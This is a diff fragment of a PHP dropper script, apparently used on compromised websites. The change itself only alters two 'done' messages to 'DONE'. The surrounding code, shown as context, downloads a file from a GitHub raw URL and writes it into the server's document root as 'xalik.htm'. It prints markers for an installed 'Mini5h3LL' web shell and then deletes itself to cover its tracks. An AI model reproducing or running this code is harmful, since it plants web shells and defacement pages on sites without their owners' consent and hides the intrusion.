@@ -17,7 +17,7 @@ if(file_exists($check)){
     echo $check."Kalix-Xalik Mini5h3LL";
 }else 
   echo "not exits";
-echo "done .\n " ;
+echo "DONE .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.htm" ;
 $text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.htm');
 $open2 = fopen($check2, 'w');
@@ -27,5 +27,5 @@ if(file_exists($check2)){
     echo $check2."Vuln!! patch it Now!";
 }else 
   echo "not exits";
-echo "done .\n " ;
+echo "DONE .\n " ;
 @unlink(__FILE__);?>
